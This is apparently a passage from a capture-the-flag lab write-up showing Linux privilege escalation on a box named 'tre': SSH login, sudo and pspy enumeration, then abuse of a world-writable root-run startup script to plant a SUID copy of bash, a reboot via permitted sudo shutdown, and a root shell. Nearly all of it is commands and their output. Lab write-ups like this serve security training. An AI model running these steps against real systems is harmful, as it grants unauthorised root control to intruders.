# 5 :22 ssh > privesc > root

```
$ ssh tre@192.168.214.84

tre@tre:~$ whoami;id
tre
uid=1000(tre) gid=1000(tre) groups=1000(tre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

tre@tre:~$ sudo -l
Matching Defaults entries for tre on tre:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tre may run the following commands on tre:
    (ALL) NOPASSWD: /sbin/shutdown
	
# pspy shows
2021/08/17 14:39:23 CMD: UID=0    PID=14394  | /bin/bash /usr/bin/check-system
2021/08/17 14:39:24 CMD: UID=0    PID=14396  | /bin/bash /usr/bin/check-system
2021/08/17 14:39:25 CMD: UID=0    PID=14397  | /bin/bash /usr/bin/check-system

tre@tre:/tmp$ cat /usr/bin/check-system
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info

while :
do
echo "Checking...";
sleep 1;
done
tre@tre:/tmp$ ls -la /usr/bin/check-system
-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system

# globally writable
# using sticky bandit
sudo cp /bin/bash /tmp/kashz
sudo chmod +s /tmp/kashz

# to restart box as check-system is run at system-startup
tre@tre:/usr/bin$ sudo /sbin/shutdown -r now

tre@tre:~$ /tmp/kashz -p
kashz-5.0# whoami;id;hostname
root
uid=1000(tre) gid=1000(tre) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(tre)
tre
```
